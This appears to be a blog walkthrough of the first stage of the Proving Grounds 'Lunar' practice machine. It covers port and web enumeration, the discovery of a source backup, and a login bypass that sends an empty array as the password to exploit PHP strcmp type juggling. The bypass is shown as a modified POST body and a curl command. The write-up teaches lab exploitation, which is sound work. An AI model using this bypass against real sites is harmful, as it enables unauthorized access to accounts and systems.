---
layout: post
title: Proving Grounds-Lunar
tags: proving_grounds, oscp, php, source code analysis
---

![](/images/pg/pg-lunar/moon.jpg)

Lunar is an "intermediate" rated box on Offensive Security's "Proving Grounds: Practice" platform. 

Offsec provides walkthroughs for their machines, but at times there are incongruities between what is stated and what works, I'd like to provide an alternative methodolgy, and hopefully show off some simpler techniques. 

Lunar highlights reading source-code and exploiting PHP vulnerabilities. 

## Enumeration 

We start off with our usual nmap scan: 

```
sudo nmap -sS -sV -sC --min-rate=10000 -p- -oN fast-nmap -vv $target
```

And get back the following: 

```
PORT      STATE SERVICE    REASON         VERSION                                                                                                           
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                      
| ssh-hostkey:                                                                                                                                              
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6R
TbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+
YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)                                                                                             
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML                                                                          
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))      
|_http-title: Lunar Studio                                                    
| http-methods:                                                                                                                                             
|_  Supported Methods: OPTIONS HEAD GET POST                            
|_http-favicon: Unknown favicon MD5: 3653AD3D6A33550E6E60970FA20E1E00                                                                                       
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                
111/tcp   open  rpcbind    syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:                                     
|   program version    port/proto  service                                                    
|   100000  2,3,4        111/tcp   rpcbind                                                    
|   100000  2,3,4        111/udp   rpcbind                                                    
|   100003  3           2049/udp   nfs         
|   100003  3,4         2049/tcp   nfs         
|   100005  1,2,3      34281/tcp   mountd                                                     
|   100005  1,2,3      38838/udp   mountd                                                     
|   100021  1,3,4      43931/tcp   nlockmgr                                                   
|   100021  1,3,4      59451/udp   nlockmgr                                                   
|   100227  3           2049/tcp   nfs_acl                                                    
|_  100227  3           2049/udp   nfs_acl                                                    
2049/tcp  open  nfs_acl    syn-ack ttl 63 3 (RPC #100227)                                     
34769/tcp open  mountd     syn-ack ttl 63 1-3 (RPC #100005)                                   
37039/tcp open  tcpwrapped syn-ack ttl 63                                                     
37645/tcp open  mountd     syn-ack ttl 63 1-3 (RPC #100005)                                   
40409/tcp open  tcpwrapped syn-ack ttl 63                                                     
43931/tcp open  nlockmgr   syn-ack ttl 63 1-4 (RPC #100021)                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

```

## Enumeration HTTP - Discovering backup.zip 

There are a number of ports open, but since a lot of web enumeration entails a lot of fuzzing of the site, we'll get started with fuzzing first. 

We can use a number of techniques to get to the next stage, which will be finding an archive (`.zip`) file of some of the sites key files. 

To find `backup.zip`, we can run `nikto` w/ the following: 

`nikto -h http://$target -o nikto.txt`

and get the following output: 

```
- Nikto v2.1.6/2.1.5
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-630: GET The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.0.1".
+ GET Server may leak inodes via ETags, header found with file /, inode: 49b7, size: 5ddbc015cc380, mtime: gzip
+ HEAD /backup.zip: Potentially interesting archive/cert file found.
+ HEAD /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ OPTIONS Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ GET Cookie PHPSESSID created without the httponly flag
+ OSVDB-3268: GET /css/: Directory indexing found.
+ OSVDB-3092: GET /css/: This might be interesting...
+ OSVDB-3268: GET /images/: Directory indexing found.
+ GET /login.php: Admin login page/section found.

```

We can also find the `.zip` using `dirsearch` or `gobuster` , here's my `dirsearch` query:

`#dirsearch.py -u $target -e html,php,txt,sh,zip -t 20 -r -f -x 400,401,404`

and its output: 

```
200     1MB  http://192.168.178.216/backup.zip
```

Note that, `dirsearch` uses the `common.txt` wordlist found, on Kali installations at `/usr/share/dirb/wordlists/common.txt`. 

## Extracting backup.zip and Reading Source

Ok, that now that we've found our way to the `backup.zip` file, we'll extract it via whatever means work best for you. I like using `7z e backup.zip`. 

Once we've extracted our files, we'll find we have a few `.php` files. 

```
completed.php
dashboard.php
login.php
pending.php

```

We can take a look at the target site and our earlier enumeration and see that we're able to access the `login.php` page. 


![](/images/pg/pg-lunar/Pasted-image-20220810141734.png)

Looking at the source for this page we can find the following: 

```
<?php                      
session_start();                                                                              
include 'creds.php';
$error = null;                                 
if ($_POST) {                  
                                                                                              
  if ($_POST['email'] && !empty($_POST['email']) && $_POST['email'] === 'liam@lunar.local' && strcmp($_POST['password'], $pwd) == 0) {
                                 
      $_SESSION['email'] = $_POST['email'];                                                   
                                                                                              
      header('Location: dashboard.php');
                                  
      die();                             
  }                                                                                                                                                                                         
  else {                                                                                      
      $error = "Email or password is incorrect.";                                             
  }                                                                                           
    }                                                                                                                                                                                       
?>   

```

The first thing we'll notice is the use of the `include` statement pointing to `creds.php`, which will get referenced in a little bit. 


Next, we'll take a look at the following `if` statement: 

```
if ($_POST['email'] && !empty($_POST['email']) && $_POST['email'] === 'liam@lunar.local' && strcmp($_POST['password'], $pwd) == 0)
```

The first part is taking the user input of the `email` variable and making sure that it's equal to `liam@lunar.local` and then there's the interesting part: 

```
strcmp($_POST['password'], $pwd)
```

The [php docs][phpdocs] say  `strcmp` function is: 

> strcmp — Binary safe string comparison

What's interesting about the string comparison in our target's source is the comparison to the `$pwd` variable. Since the variable isn't declared on the `login.php` source, its likely compared to the `$pwd` varable declared in `creds.php`. 

So, we need to either find a way to read `creds.php`  OR find a way to bypass it. 

And it turns our that `strcmp` is a strange function due to the quirks of PHP's loose comparison understandings. 

If we take a look at the following slides from an OWASP talk titled ["PHP Magic Tricks: Type Juggling"][php-owasp-talk] (Page 34, 35, 36) we get a much better understanding of the dangers of the functions as well as its implementation here: 

![](/images/pg/pg-lunar/Pasted-image-20220810143608.png)

![](/images/pg/pg-lunar/Pasted-image-20220810143625.png)

![](/images/pg/pg-lunar/Pasted-image-20220810143647.png)


Looking at our source code snippet again: 

```
strcmp($_POST['password'], $pwd)
```

We can see that the contents of that array is whatever we've sent. But PHP is kinda stupid, so what would happen if we sent along, just an empty array? 

Using Burp we can intercept our POST request to `login.php`. 

Here's our original request:

```
POST /login.php HTTP/1.1

Host: target
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.53.216
Connection: close
Referer: http://192.168.53.216/login.php
Cookie: PHPSESSID=u4jrbtublanh7khbhdluqhc3e3
Upgrade-Insecure-Requests: 1

email=liam%40lunar.local&password=strcmpMaDNess

```

We'll modify the POST data to the following: 

```
email=liam%40lunar.local&password[]=
```

Here, we're passing an empty array. Like in the slides from the OWASP talk, we're telling PHP that the password equals NULL. 

We send off the request and ....

![](/images/pg/pg-lunar/Pasted-image-20220810144533.png)

We get a  status code`302` redirecting us to `dashboard.php`.

The following curl command will get us the same: 

```
curl -i -s -k -X  POST -b 'PHPSESSID=u4jrbtublanh7khbhdluqhc3e3' --data-binary 'email=liam%40lunar.local&password[]=' http://$target/login.php


HTTP/1.1 302 Found
Date: Wed, 10 Aug 2022 19:48:23 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: dashboard.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Now that we've successfully bypassed the login page, we'll see what vulns we can find in `dashboard.php` . 

Which, I'll post about in the next post. 


* * * * 

If this post was helpful for you please feel free to reach out, or consider buying me a coffee. 

Thanks!

<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="displayerror" data-color="#FFDD00" data-emoji="" data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#ffffff" ></script>





[phpdocs]: https://www.php.net/manual/en/function.strcmp.php
[php-owasp-talk]: https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf